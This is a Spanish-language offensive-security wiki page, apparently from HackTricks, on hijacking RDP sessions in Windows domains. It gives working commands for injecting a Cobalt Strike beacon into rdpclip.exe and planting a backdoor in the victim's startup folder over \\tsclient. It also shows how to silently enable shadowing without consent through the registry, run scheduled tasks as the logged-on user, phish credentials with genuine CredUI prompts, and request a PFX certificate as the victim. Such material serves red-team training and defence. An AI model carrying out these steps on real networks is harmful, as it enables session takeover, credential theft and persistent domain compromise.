# Abuso de sesiones RDP

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

Si el **grupo externo** tiene **acceso RDP** a cualquier **equipo** en el dominio actual, un **atacante** podría **comprometer ese equipo y esperar a que el usuario inicie sesión**.

Una vez que ese usuario haya accedido vía RDP, el **atacante puede pivotar a la sesión de ese usuario** y abusar de sus permisos en el dominio externo.
```bash
# Supposing the group "External Users" has RDP access in the current domain
## lets find where they could access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```
Consulta **other ways to steal sessions with other tools** [**in this page.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## RDPInception

Si un usuario accede vía **RDP into a machine** donde un **attacker** le está **waiting**, el **attacker** podrá **inject a beacon in the RDP session of the user** y si el **victim mounted his drive** al acceder vía RDP, el **attacker could access it**.

En este caso podrías simplemente **compromise** el **victims** **original computer** escribiendo un **backdoor** en la **statup folder**.
```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

Size     Type    Last Modified         Name
----     ----    -------------         ----
dir     02/10/2021 04:11:30   $Recycle.Bin
dir     02/10/2021 03:23:44   Boot
dir     02/20/2021 10:15:23   Config.Msi
dir     10/18/2016 01:59:39   Documents and Settings
[...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```
## Shadow RDP

Si eres **local admin** en un host donde la víctima ya tiene una **active RDP session**, podrías ser capaz de **view/control that desktop without stealing the password or dumping LSASS**.

Esto depende de la política **Remote Desktop Services shadowing** almacenada en:
```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```
Valores interesantes:

- `0`: Deshabilitado
- `1`: `EnableInputNotify` (control, aprobación del usuario requerida)
- `2`: `EnableInputNoNotify` (control, **sin aprobación del usuario**)
- `3`: `EnableNoInputNotify` (solo visualización, aprobación del usuario requerida)
- `4`: `EnableNoInputNoNotify` (solo visualización, **sin aprobación del usuario**)
```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```
Esto es especialmente útil cuando un usuario privilegiado conectado por RDP dejó un escritorio desbloqueado, una sesión de KeePass, la consola MMC, una sesión de navegador o una admin shell abierta.

## Scheduled Tasks As Logged-On User

Si eres **local admin** y el usuario objetivo está **actualmente conectado**, Task Scheduler puede iniciar código **como ese usuario sin su contraseña**.

Esto convierte la sesión de inicio de sesión existente de la víctima en una primitiva de ejecución:
```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```
Notas:

- Si el usuario **no ha iniciado sesión**, Windows normalmente requiere la contraseña para crear una tarea que se ejecute como él.
- Si el usuario **ha iniciado sesión**, la tarea puede reutilizar el contexto de inicio de sesión existente.
- Esta es una forma práctica de ejecutar acciones GUI o iniciar binarios dentro de la sesión de la víctima sin tocar LSASS.

## Abuso del CredUI Prompt desde la sesión de la víctima

Una vez que puedas ejecutar **dentro del escritorio interactivo de la víctima** (por ejemplo vía **Shadow RDP** o **una tarea programada ejecutándose como ese usuario**), puedes mostrar un **prompt de credenciales de Windows real** usando CredUI APIs y recopilar las credenciales ingresadas por la víctima.

APIs relevantes:

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

Flujo típico:

1. Lanzar un binario en la sesión de la víctima.
2. Mostrar un prompt de autenticación de dominio que coincida con el branding del dominio actual.
3. Desempaquetar el auth buffer devuelto.
4. Validar las credenciales proporcionadas y, opcionalmente, seguir mostrando el prompt hasta que se ingresen credenciales válidas.

Esto es útil para **on-host phishing** porque el prompt es renderizado por las APIs estándar de Windows en lugar de un formulario HTML falso.

## Solicitar un PFX en el contexto de la víctima

La misma primitiva **scheduled-task-as-user** puede usarse para solicitar un **certificate/PFX como la víctima que ha iniciado sesión**. Ese certificado puede usarse luego para **AD authentication** como ese usuario, evitando el robo de contraseñas por completo.

Flujo a alto nivel:

1. Obtener **local admin** en un host donde la víctima ha iniciado sesión.
2. Ejecutar la lógica de enrollment/export como la víctima usando una **tarea programada**.
3. Exportar el **PFX** resultante.
4. Usar el PFX para PKINIT / certificate-based AD authentication.

Consulta las páginas de AD CS para abusos posteriores:

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## References

- [SensePost - From flat networks to locked up domains with tiering models](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [Microsoft - Remote Desktop shadow](https://learn.microsoft.com/windows/win32/termserv/remote-desktop-shadow)
- [NetExec - Shadow RDP plugin PR #465](https://github.com/Pennyw0rth/NetExec/pull/465)
- [NetExec - schtask_as module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [NetExec - Request PFX via scheduled task PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)

{{#include ../../banners/hacktricks-training.md}}
